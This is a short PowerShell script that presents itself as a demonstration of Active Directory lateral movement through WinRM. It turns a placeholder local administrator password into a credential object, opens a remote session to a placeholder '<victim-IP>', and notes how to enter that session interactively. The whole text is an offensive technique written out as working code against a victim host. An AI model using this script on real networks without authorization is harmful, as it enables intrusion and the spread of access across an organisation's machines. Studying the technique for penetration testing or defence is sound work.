# this is a basic script demonstrating AD lateral movement via WinRM

# creating the PSCredential object
$username = '<local-administrator-user>'
$password = '<password>'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;

New-PSSession -ComputerName <victim-IP> -Credential $credential

# Once this has executed, interact with created sessions using: Enter-PSSession <session-ID>
#

